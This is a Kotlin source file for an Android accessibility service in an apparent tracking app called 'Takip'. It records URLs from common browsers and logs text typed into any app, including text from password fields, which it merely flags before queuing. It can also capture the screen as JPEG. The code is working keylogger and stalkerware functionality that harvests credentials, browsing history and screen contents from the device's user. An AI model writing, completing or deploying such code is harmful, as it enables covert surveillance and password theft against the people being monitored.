package com.takip.app.service

import android.accessibilityservice.AccessibilityService
import android.os.Build
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.takip.app.util.PrefsManager

class TakipAccessibilityService : AccessibilityService() {

    private val browserPackages = setOf(
        "com.android.chrome",
        "com.google.android.googlequicksearchbox",
        "org.mozilla.firefox",
        "com.microsoft.emmx",
        "com.opera.browser",
        "com.brave.browser",
        "com.sec.android.app.sbrowser",
        "com.mi.globalbrowser",
        "com.UCMobile.intl"
    )

    private var lastUrl = ""
    private var lastText = ""

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (!PrefsManager.isSetupComplete) return
        event ?: return
        val pkg = event.packageName?.toString() ?: return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                captureBrowserUrl(pkg, event)
                captureTextInput(pkg, event)
            }
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                if (browserPackages.any { pkg.startsWith(it) }) {
                    captureBrowserUrl(pkg, event)
                }
            }
        }
    }

    private fun captureBrowserUrl(pkg: String, event: AccessibilityEvent) {
        if (!browserPackages.any { pkg.startsWith(it) }) return
        val root = rootInActiveWindow ?: return
        val url = findUrlInNode(root) ?: return
        if (url == lastUrl) return
        lastUrl = url
        val title = event.text?.firstOrNull()?.toString()
        ActivityLogQueue.addWebHistory(url, title, pkg, pkg)
    }

    private fun findUrlInNode(node: AccessibilityNodeInfo): String? {
        val text = node.text?.toString() ?: ""
        val hint = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) node.hintText?.toString() else null
        val content = text.ifBlank { hint ?: "" }

        if (content.startsWith("http") || content.contains(".com") || content.contains(".tr")) {
            if (content.length in 4..500) return content
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val found = findUrlInNode(child)
            child.recycle()
            if (found != null) return found
        }
        return null
    }

    private fun captureTextInput(pkg: String, event: AccessibilityEvent) {
        val source = event.source ?: return
        val isPassword = source.isPassword
        val text = event.text?.joinToString("") ?: source.text?.toString() ?: ""
        source.recycle()

        if (text.isBlank() || text == lastText) return
        if (text.length > 500) return
        lastText = text

        val fieldName = event.className?.toString()?.substringAfterLast('.')
        ActivityLogQueue.addInputLog(pkg, pkg, fieldName, text, isPassword)
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        instance = null
        super.onDestroy()
    }

    fun takeScreenCapture(callback: (ByteArray?) -> Unit) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            callback(null)
            return
        }
        takeScreenshot(
            android.view.Display.DEFAULT_DISPLAY,
            mainExecutor,
            object : TakeScreenshotCallback {
                override fun onSuccess(result: ScreenshotResult) {
                    try {
                        val buffer = result.hardwareBuffer
                        val bitmap = android.graphics.Bitmap.wrapHardwareBuffer(buffer, result.colorSpace)
                        buffer.close()
                        if (bitmap == null) {
                            callback(null)
                            return
                        }
                        val stream = java.io.ByteArrayOutputStream()
                        bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 70, stream)
                        bitmap.recycle()
                        callback(stream.toByteArray())
                    } catch (_: Exception) {
                        callback(null)
                    }
                }
                override fun onFailure(errorCode: Int) {
                    callback(null)
                }
            }
        )
    }

    companion object {
        var instance: TakipAccessibilityService? = null
    }
}
